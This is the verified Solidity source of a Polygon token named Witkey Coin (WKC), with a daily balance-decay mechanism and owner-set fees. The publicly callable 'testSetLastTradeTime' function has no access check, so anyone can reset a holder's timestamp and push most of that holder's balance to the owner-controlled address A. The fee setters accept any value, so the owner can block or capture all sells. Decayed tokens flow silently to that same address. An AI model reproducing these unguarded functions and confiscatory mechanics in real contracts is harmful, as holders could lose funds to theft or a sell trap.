/**
 *Submitted for verification at polygonscan.com on 2023-05-19
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint256 reserve0, uint256 reserve1, uint32 blockTimestampLast);
}

library EnumerableSet {   
    struct Set {
        bytes32[] _values;
        mapping (bytes32 => uint256) _indexes;
    }

    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    function _remove(Set storage set, bytes32 value) private returns (bool) {        
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) { 
            
            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;    
            bytes32 lastvalue = set._values[lastIndex];
            set._values[toDeleteIndex] = lastvalue;
            
            set._indexes[lastvalue] = toDeleteIndex + 1; 
            set._values.pop();
            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }
    
    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }
    
    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }
   
    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }

    struct Bytes32Set {
        Set _inner;
    }
    
    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }

    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }
    
    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }
   
    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

   
    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    struct AddressSet {
        Set _inner;
    }
    
    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }
   
    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }
   
    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }
   
    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    struct UintSet {
        Set _inner;
    }
    
    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }
    
    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }
    
    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }
    
    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }
   
    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract BaseToken is IERC20, Ownable {
    using EnumerableSet for EnumerableSet.AddressSet;
    uint8 private _decimals;  
    uint8 private _sellRate;
    uint8 private _buyRate;
    uint8 private _transferRate;

    uint32 private _burnPeriod; 
    uint256 private _addPriceTokenAmount; 
    uint256 private _totalSupply;
    uint256 private constant MAX = ~uint256(0);

    address private _addressA; 
    address private _addressB; 
    address private _usdtAddress;
    address private _usdtPairAddress;

    string private _name;
    string private _symbol;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _swapPairMap;
    EnumerableSet.AddressSet private _excludeFeeSet;
    mapping(address => uint32) public _lastTradeTime;
    
    constructor (string memory Name, string memory Symbol, uint256 Supply, address RouterAddress, address UsdtAddress, address addressA, address addressB){
        _name = Name;
        _symbol = Symbol;
        _decimals = 18;
        _usdtAddress = UsdtAddress;
        _allowances[address(this)][RouterAddress] = MAX;

        ISwapFactory swapFactory = ISwapFactory(ISwapRouter(RouterAddress).factory());
        _usdtPairAddress = swapFactory.createPair(address(this), UsdtAddress);
        _swapPairMap[_usdtPairAddress] = true;

        uint256 total = Supply * 1e18;
        _totalSupply = total;

        
        _addressA = addressA;
        _addressB = addressB;

        _balances[msg.sender] = total; 
        emit Transfer(address(0), msg.sender, total);

        _excludeFeeSet.add(msg.sender);
        _excludeFeeSet.add(addressA);
        _excludeFeeSet.add(address(this));
        _excludeFeeSet.add(RouterAddress);
        _excludeFeeSet.add(address(0x000000000000000000000000000000000000dEaD));
        _addPriceTokenAmount=1e14;
        _sellRate = 4;
        _buyRate = 4;
        _burnPeriod = 86400;
    }

    function getAllParams() external view returns(
        uint8  sellRate,
        uint8  buyRate,
        uint8  transferRate,
        uint256  addPriceTokenAmount,
        address  addressA,
        address  addressB
        ){
            sellRate = _sellRate;
            buyRate = _buyRate;
            transferRate = _transferRate;
            addPriceTokenAmount = _addPriceTokenAmount;
            addressA = _addressA;
            addressB = _addressB;
    }

    function pairAddress() external view returns (address) {
        return _usdtPairAddress;
    }

    function usdtAddress() external view returns (address) {
        return _usdtAddress;
    }
    
    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        if(_swapPairMap[account] || _excludeFeeSet.contains(account)){
            return _balances[account];
        }
        return _viewBalance(account, block.timestamp);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function rpow(uint256 x,uint256 n,uint256 scalar) internal pure returns (uint256 z) {
        
        assembly {
            switch x
            case 0 {
                switch n
                case 0 {
                    
                    z := scalar
                }
                default {
                    
                    z := 0
                }
            }
            default {
                switch mod(n, 2)
                case 0 {
                    
                    z := scalar
                }
                default {
                    
                    z := x
                }

                
                let half := shr(1, scalar)

                for {
                    
                    n := shr(1, n)
                } n {
                    
                    n := shr(1, n)
                } {
                    
                    
                    if shr(128, x) {
                        revert(0, 0)
                    }

                    
                    let xx := mul(x, x)

                    
                    let xxRound := add(xx, half)

                    
                    if lt(xxRound, xx) {
                        revert(0, 0)
                    }

                    
                    x := div(xxRound, scalar)

                    
                    if mod(n, 2) {
                        
                        let zx := mul(z, x)

                        
                        if iszero(eq(div(zx, x), z)) {
                            
                            if iszero(iszero(x)) {
                                revert(0, 0)
                            }
                        }

                        
                        let zxRound := add(zx, half)

                        
                        if lt(zxRound, zx) {
                            revert(0, 0)
                        }

                        
                        z := div(zxRound, scalar)
                    }
                }
            }
        }
    }

    function getRemainBalance(uint balance, uint256 r, uint n) public pure returns(uint){
        return balance*rpow(r,n,10000)/10000;
    }

    function getBalanceChangeInfo(address account, uint256 time) public view returns(uint32 burnRate, uint256 burnTimes){
        uint256 burnPeriod = _burnPeriod;
        uint256 lastTradeTime = uint256(_lastTradeTime[account]);
        uint256 begin = lastTradeTime - lastTradeTime%burnPeriod;
        burnTimes = (time - time%burnPeriod - begin)/burnPeriod; 
        burnRate = 9999; 
    }

    function _viewBalance(address account,uint256 time) internal view returns(uint){

        uint balance = _balances[account];
        if( balance > 0 ){
            (uint32 burnRate, uint256 burnTimes) = getBalanceChangeInfo(account, time);
            uint remainBalance=getRemainBalance(balance, burnRate, burnTimes);           
            return remainBalance;
        }
        return balance;
    }

    function _updateBalance(address account,uint256 time) internal {
        if(_swapPairMap[account] || _excludeFeeSet.contains(account)) return; 
        uint balance = _balances[account];
        if( balance > 0 ){
            uint viewBalance = _viewBalance(account,time);
            if( balance > viewBalance){
                _lastTradeTime[account] = uint32(time);
                uint burnAmount = balance - viewBalance;
                _tokenTransfer(account, _addressA, burnAmount); 
            }
        }else{
            _lastTradeTime[account] = uint32(time); 
        }
    }

    function _isLiquidity(address from,address to) internal view returns(bool isAdd,bool isDel){        
        (uint r0,uint r1,) = IUniswapV2Pair(_usdtPairAddress).getReserves();
        uint rUsdt = r0;  
        uint bUsdt = IERC20(_usdtAddress).balanceOf(_usdtPairAddress);      
        if(address(this)<_usdtAddress){ 
            rUsdt = r1; 
        }
        if( _swapPairMap[to] ){ 
            if( bUsdt >= rUsdt ){
                isAdd = bUsdt - rUsdt >= _addPriceTokenAmount; 
            }
        }
        if( _swapPairMap[from] ){   
            isDel = bUsdt <= rUsdt;  
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {       
        require(amount > 0, "XXB: transfer amount must be bg 0");
        uint time = block.timestamp;
        if (_excludeFeeSet.contains(from) || _excludeFeeSet.contains(to) ){            
            _tokenTransfer(from, to, amount);
            if(!_swapPairMap[to] && !_excludeFeeSet.contains(to)) {
                
                _lastTradeTime[to] = uint32(time); 
            }
        }else{
            (bool isAddLiquidity, bool isDelLiquidity) = _isLiquidity(from,to);
            if(isAddLiquidity || isDelLiquidity){
                _tokenTransfer(from, to, amount); 
                if(isDelLiquidity) _lastTradeTime[to] = uint32(time); 
            }else{
                uint feeRate = _sellRate; 
                if(_swapPairMap[from]){ 
                    feeRate = _buyRate; 
                }else if(_swapPairMap[to]){ 
                    
                }else{
                    
                    feeRate = _transferRate;
                    _lastTradeTime[to] = uint32(time); 
                }
                if(feeRate>0) _tokenTransfer(from, _addressB, amount*feeRate/100); 
                _tokenTransfer(from, to, amount*(100-feeRate)/100);
            }
        }
    }
    
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        _balances[recipient] = _balances[recipient] + tAmount;
        emit Transfer(sender, recipient, tAmount);
    }

    function setAddressA(address addr) external onlyOwner {
        _addressA = addr;
    }

    function setAddressB(address addr) external onlyOwner {
        _addressB = addr;
    }

    function updateFeeExclude(address addr, bool isRemove) external onlyOwner {
        if(isRemove) _excludeFeeSet.remove(addr);
        else _excludeFeeSet.add(addr);
    } 

    function isExcludeFeeAddress(address account) external view returns(bool){
        return _excludeFeeSet.contains(account);
    }

    function getExcludeFeeAddressList() external view returns(address [] memory){
        uint size = _excludeFeeSet.length();
        address[] memory addrs = new address[](size);
        for(uint i=0;i<size;i++) addrs[i]= _excludeFeeSet.at(i);
        return addrs;
    }

    function setSwapPairMap(address addr, bool enable) external onlyOwner {
        _swapPairMap[addr] = enable;
    }

    function setSellRate(uint8 rate) external onlyOwner {
        _sellRate = rate;
    }

    function setBuyRate(uint8 rate) external onlyOwner {
        _buyRate = rate;
    }

    function setTransferRate(uint8 rate) external onlyOwner {
        _transferRate = rate;
    }

    function setAddPriceTokenAmount(uint256 amount) external onlyOwner {
        _addPriceTokenAmount = amount;
    }
    receive() external payable {}
   
    function testSetLastTradeTime(address account, uint32 time) external{
        _lastTradeTime[account] = time;
    }
}


contract WKC is BaseToken {
    constructor() BaseToken(
        "Witkey Coin",
        "WKC",
        10*1e8, 
        address(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff), 
        address(0xc2132D05D31c914a87C6611C10748AEb04B58e8F), 
        address(0x1C4Dd0130033F5ec12483577731aB6fd66109791), 
        address(0x1C4Dd0130033F5ec12483577731aB6fd66109791) 
    ){

    }
}